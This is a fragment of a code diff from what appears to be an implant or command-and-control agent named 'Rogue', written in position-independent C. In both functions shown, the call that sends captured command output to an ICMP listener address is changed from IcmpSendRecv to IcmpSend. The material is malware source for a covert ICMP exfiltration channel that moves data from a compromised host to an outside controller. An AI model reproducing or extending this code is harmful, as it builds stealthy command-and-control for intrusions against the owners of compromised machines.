@@ -58,7 +58,7 @@ D_SEC( B ) VOID RogueOutput( _In_ PROGUE_CTX Context, _In_ PCHAR Buffer, _In_ UI
 					Ret->ReturnCode = 0; // change me!
 					Ret->ErrorValue = 0;
 
-					IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Buf->Buffer, Buf->Length, NULL, NULL, NULL );
+					IcmpSend( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Context, Buf->Buffer, Buf->Length );
 				};
 			};
 		};
@@ -117,7 +117,7 @@ D_SEC( B ) VOID RoguePrintf( _In_ PROGUE_CTX Context, _In_ PCHAR Format, ... )
 					Len = Api._vsnprintf( Ret->Buffer, Len, Format, Lst );
 					va_end( Lst );
 
-					IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Buf->Buffer, Buf->Length, NULL, NULL, NULL );
+					IcmpSend( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Context, Buf->Buffer, Buf->Length );
 				};
 			};
 		};
